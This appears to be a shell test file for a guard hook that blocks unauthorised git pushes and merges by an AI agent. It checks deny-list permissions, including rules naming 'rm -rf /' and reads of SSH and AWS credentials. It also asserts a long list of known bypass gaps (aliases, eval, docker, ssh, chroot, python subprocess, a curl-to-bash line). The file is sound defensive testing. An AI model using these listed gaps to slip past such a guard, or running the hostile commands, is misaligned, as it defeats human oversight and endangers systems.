SCRATCH="$(mk_repo)"
assert_eq "the fixture identity really is the firm's test identity" "test@agent-firm.local" \
  "$(git -C "$SCRATCH" config user.email)"
for c in 'git add -A' 'git commit -qm seed' 'git init -q .' 'git symbolic-ref HEAD refs/heads/main' \
         'git worktree add -q /tmp/wt -b wt/x' 'git rev-parse HEAD' 'git branch -a' \
         'git -c user.email=eval@firm -c user.name=eval commit -qm fixture' \
         'bash tests/run-tests.sh' 'bin/firm-run-evals --structural' 'bin/firm-doctor'; do
  assert_rc "firm fixture command is not gated: $c" 0 \
    mg "$TREE" "$EXPLODE" "$SCRATCH" --command "$c"
done
assert_eq "and none of them spawned gh/git/python3" "" \
  "$(mg "$TREE" "$EXPLODE" "$SCRATCH" --command 'git -c user.email=eval@firm commit -qm fixture' 2>&1)"

# ============================================================ AC-025 · no permission weakened
t_case "AC-025 no permission rule is weakened"
assert_ok "Bash(git push:*) is STILL in deny" python3 -c "
import json
p = json.load(open('$SETTINGS'))['permissions']
assert 'Bash(git push:*)' in p['deny'], p['deny']
"
assert_ok "and it is NOT in ask or allow (the dead duplicate is gone, deny wins)" python3 -c "
import json
p = json.load(open('$SETTINGS'))['permissions']
assert 'Bash(git push:*)' not in p['ask'], p['ask']
assert 'Bash(git push:*)' not in p['allow'], p['allow']
"
assert_ok "the allow list is EXACTLY the six pre-existing entries — nothing added" python3 -c "
import json
allow = json.load(open('$SETTINGS'))['permissions']['allow']
assert allow == ['Read','Grep','Glob','Edit','Write','Bash(*)'], allow
"
assert_ok "nothing moved from deny to ask/allow: every security-critical deny is still there" python3 -c "
import json
deny = json.load(open('$SETTINGS'))['permissions']['deny']
for r in ['Bash(sudo:*)','Bash(git push:*)','Bash(rm -rf /)','Bash(cat ~/.ssh/**)',
          'Read(~/.ssh/**)','Read(~/.aws/**)','Read(~/.claude.json)','Bash(cat .env*)',
          'Read(./.env)','Bash(shutdown:*)','Bash(reboot:*)']:
    assert r in deny, f'{r} disappeared from deny'
assert len(deny) == 32, f'deny changed size: {len(deny)}'
"
assert_ok "git merge stays ASK (the guard is additive, not a replacement)" python3 -c "
import json
p = json.load(open('$SETTINGS'))['permissions']
assert 'Bash(git merge:*)' in p['ask'], p['ask']
assert 'Bash(gh:*)' in p['ask'], p['ask']
"

# ============================================================ AC-027 · end to end
t_case "AC-027 end-to-end through the real hook surface: a refusal and a permit"
E2E_BAD="$(mk_id_repo nobody@example.com)"
mk_run "$E2E_BAD" "20260803T000020Z-e2e"
assert_rc "REFUSED: a merge to main under a non-allowed identity blocks the tool call" 2 \
  mg_hook "$TREE" "$GH_OK" "$E2E_BAD" 'git switch main && git merge feature/x'
assert_output "  and the agent is told why" "identity NOT authorised" \
  mg_hook "$TREE" "$GH_OK" "$E2E_BAD" 'git switch main && git merge feature/x'
assert_ok "  and the refusal is in the run ledger" python3 -c "
import json
p='$E2E_BAD/.agent-firm/runs/20260803T000020Z-e2e/run.jsonl'
recs=[json.loads(l) for l in open(p) if l.strip()]
assert any(r.get('event')=='merge_guard_block' for r in recs), recs
"
E2E_OK="$(mk_id_repo "$ALLOWED_EMAIL")"
assert_rc "PERMITTED: the SAME command under an allow-listed identity does not block" 0 \
  mg_hook "$TREE" "$GH_OK" "$E2E_OK" 'git switch main && git merge feature/x'

t_case "AC-027 the guard documents its own surface, and the docs match the code"
assert_output "--surface lists the covered forms" "git push — every flag form" mg_env "$TREE" "$PATH" "$REPO_OK" --surface
assert_output "--surface lists the KNOWN GAPS honestly" "KNOWN GAPS" mg_env "$TREE" "$PATH" "$REPO_OK" --surface
assert_output "--surface names the alias gap" "ALIAS" mg_env "$TREE" "$PATH" "$REPO_OK" --surface
assert_output "--surface names the non-shell gap" "Non-shell surfaces" mg_env "$TREE" "$PATH" "$REPO_OK" --surface
assert_output "--help prints the exit contract" "EXIT CONTRACT" mg_env "$TREE" "$PATH" "$REPO_OK" --help
assert_output "--help prints the usage" "USAGE" mg_env "$TREE" "$PATH" "$REPO_OK" --help
# --help prints a fixed LINE RANGE of the source, so it silently truncates whenever the header
# grows. Assert it reaches the END of the header, not just the start: without this, a paragraph
# added anywhere above the last one disappears from --help and nothing notices.
assert_ok "--help prints the header through to its LAST line (the sed range has not drifted)" \
  python3 -c "
import subprocess
lines = open('$GUARD').readlines()
end = next(i for i, l in enumerate(lines) if l.startswith('set -uo pipefail'))
last = lines[end - 1].lstrip('#').strip()
assert last, 'the line above set -uo pipefail is blank; pick a different anchor'
out = subprocess.run(['$TREE/bin/firm-merge-guard', '--help'], capture_output=True, text=True).stdout
assert last in out, (
    'the last header line is missing from --help, so the sed range in the --help branch is stale.\n'
    '  wanted: %r' % last)
first = lines[1].lstrip('#').strip()
assert first in out, 'the FIRST header line is missing from --help too'
print('ok')
"

# ================================================== AC-019/SEC-02 · the COVERED list is honest
# THE BLOCKER THIS SECTION EXISTS FOR. The disclosed COVERED/GAPS list is the mechanism the human
# is asked to trust in place of real branch protection, and it affirmatively claimed three things
# that were false: "wrappers (sudo/env/command/exec/time/nohup/nice/xargs-free)" (true only for the
# BARE form), "`bash -c '<cmd>'`" (missed -ec/-xc), and "a shell heredoc body fed to bash/sh/zsh"
# (missed `cat <<'EOF' | bash`). "git push (every form: ...)" was also literally false once a
# leading redirect or a brace group was present.
#
# Every one of those is now genuinely covered and asserted above. These assertions pin the WORDING
# so the retracted claims cannot come back, and drive the printed launcher set against the code.
t_case "AC-019/SEC-02 the retracted overclaims are gone from --surface"
surface_text() { mg_env "$TREE" "$PATH" "$REPO_OK" --surface; }
assert_not_output "the 'xargs-free' aside is gone (it was a gap hidden inside a COVERED bullet)" \
  "xargs-free" surface_text
assert_not_output "the unqualified 'every form:' claim is gone" "every form:" surface_text
assert_output "the wrapper bullet now says FLAGS AND FLAG VALUES, not just the bare word" \
  "AND ITS OWN FLAGS AND FLAG VALUES" surface_text
assert_output "the shell bullet says 'cluster containing' rather than naming one spelling" \
  "short-option cluster containing" surface_text
assert_output "the heredoc bullet says ANY segment of the introducing line" \
  "ANY segment of the introducing line is a shell" surface_text
assert_output "the quoting/escaping coverage is stated" "shell QUOTING or ESCAPING" surface_text
assert_output "the git-config write coverage is stated, with reads excluded" \
  "READS are NOT matched" surface_text
assert_output "the launcher set is printed in full, and labelled a name list" \
  "the launcher set, in full (a NAME LIST, not a rule)" surface_text
assert_output "GAPS says every gap line has its own PERMIT assertion" \
  "each line has its own PERMIT assertion" surface_text
# ---- the claims this wave ADDED. Each one is driven by an assertion above; pinned here so the
# printed document and the behaviour cannot come apart in either direction.
assert_output "COVERED states the flag-VALUE case, in BOTH readings" \
  "a launcher flag VALUE that is itself spelled like a command word, in EITHER reading" surface_text
assert_output "  and names the sudo -u git form specifically" "sudo -u git git push" surface_text
assert_output "  and says which way ambiguity resolves" "Ambiguity resolves toward blocking." surface_text
assert_output "COVERED states the multi-call dispatcher case" "busybox sh -c" surface_text
assert_output "COVERED states the here-string-piped-onward case" \
  "cat <<< '<cmd>' | bash" surface_text
assert_output "COVERED states process substitution" "cat <(git push origin main)" surface_text
assert_output "  and says which process-substitution shape is a GAP instead" \
  "bash <(echo 'git push')" surface_text
assert_output "COVERED says the SUBCOMMAND is normalised too, not only the command word" \
  "git \$'push'" surface_text
assert_output "GAPS names the container/VM launchers as out of scope" \
  "docker run ... git push" surface_text
assert_output "GAPS names the dashed git-<sub> form" "git-push origin main" surface_text
assert_output "GAPS names the two positional-consuming launchers, and no others" \
  "chroot /newroot git push" surface_text
assert_output "  and says the flag-operand launchers are covered, not gapped" \
  "are covered, not gapped" surface_text

t_case "AC-019/SEC-02 every launcher --surface NAMES is really treated as a launcher"
# Drives the PRINTED list against the BEHAVIOUR, name by name. What it catches: a name added to the
# doc text but not to the code (and vice versa, since the doc is generated from the code — so a
# hand-edited doc line fails here). What it does NOT catch: a name deleted from both, which is what
# the per-form assertions in the SEC-01 sections above are for.
LAUNCHERS="$(surface_text | python3 -c "
import sys
lines = sys.stdin.read().splitlines()
i = [k for k, l in enumerate(lines) if 'the launcher set, in full' in l]
assert i, 'the launcher set is not printed by --surface'
out = []
for l in lines[i[0] + 1:]:
    if l.strip() and l.startswith('      '):
        out.append(l.strip())
    else:
        break
assert out, 'the launcher set marker is printed but the set itself is not'
print(' '.join(' '.join(out).split()))
")"
assert_ne "the printed launcher set is non-empty" "" "$LAUNCHERS"
for _w in $LAUNCHERS; do
  assert_rc "launcher '$_w' resolves to the command it launches" 1 \
    mg "$TREE" "$GH_OK" "$REPO_BAD" --command "$_w git push origin main"
done

t_case "AC-019/SEC-02 known gaps are asserted as gaps, so this list cannot drift either"
# These are NOT wins. Each line printed under KNOWN GAPS by --surface has an assertion here, in
# both modes, so closing one FAILS this file and forces the printed list to be updated. An honest
# gap beats a fragile block; an UNDISCLOSED gap is the thing that made the previous round a blocker.
mg_gap "an unlisted launcher name"           'mywrap git push origin main'
mg_gap "a launcher whose cmd follows a positional it consumes (flock <file> cmd)" \
                                             'flock /tmp/lock git push origin main'
mg_gap "a git alias for push is invisible"   'git ps origin main'
mg_gap "a variable-indirected git"           'g=git; $g push origin main'
mg_gap "eval of an assembled string"         'eval "$(printf "%s" "git push origin main")"'
mg_gap "a command string arriving on stdin"  'echo "git push origin main" | xargs -I{} bash -c "{}"'
mg_gap "a push inside a script FILE"         'bash deploy-and-push.sh'
mg_gap "a sourced script file"               '. deploy-and-push.sh'
mg_gap "a shell reading its program from stdin redirection" 'bash -s < deploy-and-push.sh'
mg_gap "shell nesting deeper than 3"         "bash -c \"bash -c \\\"bash -c 'bash -c \\\\\\\"git push\\\\\\\"'\\\"\""
# ...and the bound really is at 3, not "nesting is broken": the same shape one level shallower
# BLOCKS. Without this, the gap assertion above would also pass if recursion never worked at all.
assert_rc "nesting UP TO 3 levels is covered (so the gap above is a bound, not a hole)" 1 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "bash -c \"bash -c 'bash -c \\\"git push\\\"'\""
mg_gap "hub is not covered"                  'hub push origin main'
mg_gap "glab is not covered"                 'glab mr merge 3'
mg_gap "git svn dcommit is not covered"      'git svn dcommit'
mg_gap "gh workflow run (one indirection)"   'gh workflow run deploy.yml'
mg_gap "a local ref move: git branch -f"     'git branch -f main abc1234'
mg_gap "a local ref move: git update-ref"    'git update-ref refs/heads/main abc1234'
mg_gap "a read-only gh api GET"              'gh api repos/o/r/branches/main --jq .protected'
mg_gap "an identity change as a FILE append" 'printf "[user]\n\temail = x@y.z\n" >> .git/config'
mg_gap "an identity change via sed -i"       'sed -i "" "s/ci@/x@/" ~/.gitconfig'
mg_gap "git config --edit (an editor, not a value)" 'git config --global --edit'
mg_gap "firm-integrate merges internally, by its own allowlist" \
                                             'firm-integrate 20260803T120043Z-slug wo-a wo-b'
# ---- gaps NAMED for the first time in this wave. Each is a form the fix wave did NOT close, so it
# is disclosed rather than left silent — silence in this list is the defect SEC-02 was raised for.
# `bash <(echo '<cmd>')` looks like the process substitution now covered above, and is not: there the
# gated text is INSIDE the parens, here it is the OUTPUT of what is inside them, which the guard
# would have to RUN to see. Same class as `echo 'git push' | bash`, which was already declared.
mg_gap "process substitution feeding a shell (the OUTPUT is the script)" \
                                             "bash <(echo 'git push origin main')"
mg_gap "  and the curl form of the same shape" 'bash <(curl -s https://example.invalid/x)'
mg_gap "the DASHED builtin form: git-push"   'git-push origin main'
mg_gap "  git-merge"                         'git-merge feature/x'
mg_gap "  git-config (dashed identity write)" 'git-config --global user.email a@b.c'
mg_gap "third-party git-* porcelain"         'git-lfs push origin main'
mg_gap "a launcher whose command follows a POSITIONAL it consumes: chroot <dir> cmd" \
                                             'chroot /newroot git push origin main'
mg_gap "  and with an absolute path to git behind it" \
                                             'chroot /newroot /usr/bin/git push origin main'
# ...and the boundary of THAT gap is asserted, not assumed: the neighbouring launchers whose operands
# are FLAGS are COVERED, so the gap is a shape (a consumed positional), not a set of names. Without
# these three the gap line above would read as "these launchers do not work", which is false — and
# claiming LESS coverage than exists is the same kind of dishonesty as claiming more.
assert_rc "not a gap: nsenter's operands are flags, so the command word resolves" 1 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'nsenter -t 1 -m /usr/bin/git push origin main'
assert_rc "not a gap: systemd-run --unit=x resolves" 1 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'systemd-run --unit=x /usr/bin/git push origin main'
assert_rc "not a gap: setpriv --reuid=1000 resolves" 1 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'setpriv --reuid=1000 git push origin main'
mg_gap "a container launcher (different fs + identity context)" \
                                             'docker run --rm -v .:/r alpine git push origin main'
mg_gap "  podman run"                        'podman run --rm alpine git push origin main'
mg_gap "a remote launcher over ssh"          "ssh host 'git push origin main'"
assert_rc "GAP: a heredoc body fed to a NON-shell is skipped" 0 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command "python3 - <<'PY'
print('git push origin main')
PY"
assert_rc "GAP: a push from python is not covered" 0 \
  mg "$TREE" "$GH_OK" "$REPO_BAD" --command 'python3 -c "import subprocess;subprocess.run([chr(103)+chr(105)+chr(116)])"'

t_summary
